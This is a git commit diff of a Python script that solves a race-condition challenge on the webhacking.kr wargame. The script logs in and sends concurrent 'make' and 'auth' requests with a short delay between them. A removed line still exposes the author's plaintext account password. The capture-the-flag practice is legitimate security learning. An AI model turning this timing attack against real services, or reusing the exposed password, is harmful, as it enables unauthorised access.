64f75f8bfe82967fbbe47ab8ea9cd5b632402422
Myeongseokkang <kms00129@naver.com>
2022-02-15 21:00:44 +0900

    [60번] 풀이 업로드

--- 60-race_condition.py
+++ 60-race_condition.py
@@ -9,7 +9,7 @@ random.seed(time.time())
 url = 'https://webhacking.kr/challenge/web-37/'
 
 
-# 먼저 nc 포트를 열어 놔야 한다.
+# 쿠키의 PHPSESSID를 정수값이 들어가도록 해준다.
 def login(session):
     session.get("https://webhacking.kr")
     rand = str(random.randint(1,10000000))
@@ -18,7 +18,7 @@ def login(session):
     datas = {}
     print(" ------------ login ----------------------")
     datas['id'] = 'oksusu98'
-    datas['pw'] = 'rkdaudtjr1!'
+    datas['pw'] = '비밀번호'
     response = session.post("https://webhacking.kr/login.php?login",data=datas)
     if( "<script>location.href='/';</script>" in response.text):
         print("login success : ",datas['id'])
@@ -31,7 +31,7 @@ def solve(param):
     url = 'https://webhacking.kr/challenge/web-37/'
     session = requests.session()
     login(session)
-    print(session.cookies)
+#    print(session.cookies)
     response = session.get(url,params={'mode':param})
     return response.text
     
@@ -40,14 +40,15 @@ def solve(param):
 if __name__ == '__main__':
     p = Pool(4)
     ret1 = p.apply_async(solve,('make',))
+    time.sleep(0.3)
     ret2 = p.apply_async(solve,('auth',))
-    ret3 = p.apply_async(solve,('make',))
-    ret4 = p.apply_async(solve,('auth',))
+    #ret3 = p.apply_async(solve,('make',))
+    #ret4 = p.apply_async(solve,('auth',))
 
     print(ret1.get())
     print(ret2.get())
-    print(ret3.get())
-    print(ret4.get())
+    #print(ret3.get())
+    #print(ret4.get())
 
     p.close()
     p.join()
